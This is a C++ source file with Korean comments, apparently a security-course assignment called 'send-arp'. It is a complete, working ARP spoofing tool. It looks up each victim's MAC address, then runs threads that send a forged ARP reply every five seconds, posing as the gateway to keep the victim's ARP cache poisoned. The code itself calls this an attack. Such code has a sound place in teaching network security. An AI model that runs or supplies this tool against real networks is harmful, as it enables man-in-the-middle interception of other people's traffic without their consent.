#include <cstdio>

#include <pcap.h>

#include <unistd.h>

#include <sys/ioctl.h>

#include <net/if.h>

#include <sys/socket.h>

#include <arpa/inet.h>

#include <vector>

#include <thread>

#include <chrono>



#include "ethhdr.h"

#include "arphdr.h"



#pragma pack(push, 1)

struct EthArpPacket final {

    EthHdr eth_;

    ArpHdr arp_;

};

#pragma pack(pop)



// 프로그램 사용법 출력 함수

void usage() {

    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");

    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");

}



// 인터페이스 이름을 기반으로 나의(공격자) MAC 주소를 가져오는 함수

bool getMyMac(const char* dev, Mac* mac) {

    struct ifreq ifr;

    int s = socket(AF_INET, SOCK_DGRAM, 0);

    if (s < 0) {

        perror("socket");

        return false;

    }



    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {

        perror("ioctl");

        close(s);

        return false;

    }



    *mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    close(s);

    return true;

}



// 인터페이스 이름을 기반으로 나의(공격자) IP 주소를 가져오는 함수

bool getMyIp(const char* dev, Ip* ip) {

    struct ifreq ifr;

    int s = socket(AF_INET, SOCK_DGRAM, 0);

    if (s < 0) {

        perror("socket");

        return false;

    }



    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {

        perror("ioctl");

        close(s);

        return false;

    }



    *ip = Ip(ntohl((reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr))->sin_addr.s_addr));

    close(s);

    return true;

}



// ARP Request를 보내 대상의 MAC 주소를 알아내는 함수

Mac getTargetMac(pcap_t* handle, Mac myMac, Ip myIp, Ip targetIp) {

    // 1. ARP Request 패킷 생성

    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac(); // 목적지 MAC: 브로드캐스트

    packet.eth_.smac_ = myMac;

    packet.eth_.type_ = htons(EthHdr::Arp);



    packet.arp_.hrd_ = htons(ArpHdr::ETHER);

    packet.arp_.pro_ = htons(EthHdr::Ip4);

    packet.arp_.hln_ = Mac::Size;

    packet.arp_.pln_ = Ip::Size;

    packet.arp_.op_ = htons(ArpHdr::Request);

    packet.arp_.smac_ = myMac;

    packet.arp_.sip_ = htonl(myIp);

    packet.arp_.tmac_ = Mac::nullMac(); // 타겟 MAC은 모르므로 00:00:00:00:00:00

    packet.arp_.tip_ = htonl(targetIp);



    // 2. 패킷 전송

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {

        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));

        return Mac::nullMac(); // 실패 시 Null MAC 반환

    }



    // 3. ARP Reply 캡처

    while (true) {

        struct pcap_pkthdr* header;

        const u_char* reply_packet;

        int res = pcap_next_ex(handle, &header, &reply_packet);

        if (res == 0) continue; // 타임아웃

        if (res == -1 || res == -2) {

            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));

            return Mac::nullMac();

        }



        EthArpPacket* arp_reply = (EthArpPacket*)reply_packet;

        // ARP Reply이고, 요청한 IP로부터 온 응답인지 확인

        if (ntohs(arp_reply->eth_.type_) == EthHdr::Arp &&

            ntohs(arp_reply->arp_.op_) == ArpHdr::Reply &&

            arp_reply->arp_.sip() == targetIp) {

            return arp_reply->arp_.smac(); // 타겟의 MAC 주소 반환

        }

    }

}



// 변조된 ARP Reply(Infection) 패킷을 전송하는 함수

void sendArpInfection(pcap_t* handle, Mac myMac, Mac senderMac, Ip senderIp, Ip targetIp) {

    EthArpPacket packet;



    packet.eth_.dmac_ = senderMac;      // 목적지 MAC: 희생자(sender)의 MAC

    packet.eth_.smac_ = myMac;          // 출발지 MAC: 공격자(나)의 MAC

    packet.eth_.type_ = htons(EthHdr::Arp);



    packet.arp_.hrd_ = htons(ArpHdr::ETHER);

    packet.arp_.pro_ = htons(EthHdr::Ip4);

    packet.arp_.hln_ = Mac::Size;

    packet.arp_.pln_ = Ip::Size;

    packet.arp_.op_ = htons(ArpHdr::Reply); // Opcode: Reply

    packet.arp_.smac_ = myMac;              // Sender MAC: 공격자(나)의 MAC

    packet.arp_.sip_ = htonl(targetIp);     // Sender IP: 타겟(게이트웨이)의 IP. 희생자를 속이는 부분

    packet.arp_.tmac_ = senderMac;          // Target MAC: 희생자(sender)의 MAC

    packet.arp_.tip_ = htonl(senderIp);     // Target IP: 희생자(sender)의 IP



    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    if (res != 0) {

        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));

    }

}



// 각 세션(희생자-타겟 쌍)에 대한 공격을 수행하는 스레드 함수

void attackThreadFunc(pcap_t* handle, Mac myMac, Mac senderMac, Ip senderIp, Ip targetIp) {

    while (true) {

        sendArpInfection(handle, myMac, senderMac, senderIp, targetIp);

        printf("ARP infection packet sent to %s (target: %s)\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());

        std::this_thread::sleep_for(std::chrono::seconds(5)); // 5초마다 반복적으로 전송하여 ARP 테이블 변조 상태 유지

    }

}



int main(int argc, char* argv[]) {

    // 인자 개수 확인

    if (argc < 4 || (argc - 2) % 2 != 0) {

        usage();

        return EXIT_FAILURE;

    }



    char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE];

    // 과제 요구사항에 맞게 pcap 핸들 설정

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (pcap == nullptr) {

        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);

        return EXIT_FAILURE;

    }



    // 공격자 정보(MAC, IP) 가져오기

    Mac myMac;

    if (!getMyMac(dev, &myMac)) {

        fprintf(stderr, "Failed to get MAC address for %s\n", dev);

        pcap_close(pcap);

        return EXIT_FAILURE;

    }

    printf("Attacker MAC: %s\n", std::string(myMac).c_str());



    Ip myIp;

    if (!getMyIp(dev, &myIp)) {

        fprintf(stderr, "Failed to get IP address for %s\n", dev);

        pcap_close(pcap);

        return EXIT_FAILURE;

    }

    printf("Attacker IP: %s\n", std::string(myIp).c_str());



    std::vector<std::thread> attackThreads;



    // 인자로 받은 모든 (sender, target) 쌍에 대해 처리

    for (int i = 2; i < argc; i += 2) {

        Ip senderIp(argv[i]);

        Ip targetIp(argv[i + 1]);



        printf("\n[Session %d] Resolving MAC for sender %s...\n", (i/2), std::string(senderIp).c_str());

        Mac senderMac = getTargetMac(pcap, myMac, myIp, senderIp);



        if (senderMac.isNull()) {

            fprintf(stderr, "Failed to get MAC for sender %s. Skipping this session.\n", std::string(senderIp).c_str());

            continue;

        }

        printf("Sender %s MAC: %s\n", std::string(senderIp).c_str(), std::string(senderMac).c_str());



        // 각 세션에 대한 공격 스레드 생성 및 시작

        attackThreads.emplace_back(attackThreadFunc, pcap, myMac, senderMac, senderIp, targetIp);

    }



    printf("\nStarting ARP spoofing attacks...\n");



    // 모든 공격 스레드가 끝날 때까지 대기 (실제로는 무한 루프이므로 메인 스레드는 종료되지 않음)

    for (auto& th : attackThreads) {

        th.join();

    }



    pcap_close(pcap);

    return 0;

}


